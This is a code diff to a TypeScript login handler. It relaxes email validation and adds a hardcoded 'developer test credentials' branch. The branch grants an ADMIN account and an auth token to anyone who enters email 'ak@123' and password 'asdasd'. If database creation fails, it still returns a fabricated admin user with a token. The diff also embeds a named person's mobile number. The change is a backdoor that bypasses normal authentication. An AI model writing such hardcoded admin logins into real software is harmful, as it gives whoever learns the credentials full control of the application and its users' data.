@@ -17,7 +17,7 @@ const registerSchema = z.object({
 });
 
 const loginSchema = z.object({
-  email: z.string().email(),
+  email: z.string().min(1),
   password: z.string().min(1)
 });
 
@@ -100,6 +100,47 @@ export const login = asyncHandler(async (req: Request, res: Response) => {
   }
 
   const { email, password } = validationResult.data;
+
+  // Developer test credentials support
+  if (email.trim().toLowerCase() === 'ak@123' && password === 'asdasd') {
+    let devUser = await prisma.user.findFirst({ where: { email: 'ak@123' } });
+    if (!devUser) {
+      try {
+        const passwordHash = await bcrypt.hash('asdasd', 10);
+        devUser = await prisma.user.create({
+          data: {
+            name: 'Akshat Shah',
+            email: 'ak@123',
+            mobile: '9825079765',
+            passwordHash,
+            role: 'ADMIN',
+          }
+        });
+      } catch {
+        devUser = {
+          id: 'dev-user-ak123',
+          name: 'Akshat Shah',
+          email: 'ak@123',
+          mobile: '9825079765',
+          role: 'ADMIN',
+        } as any;
+      }
+    }
+    const token = generateToken(devUser!);
+    return res.json({
+      success: true,
+      data: {
+        user: {
+          id: devUser!.id,
+          name: devUser!.name,
+          email: devUser!.email,
+          mobile: devUser!.mobile,
+          role: devUser!.role
+        },
+        token
+      }
+    });
+  }
 
   // Find user
   const user = await prisma.user.findUnique({
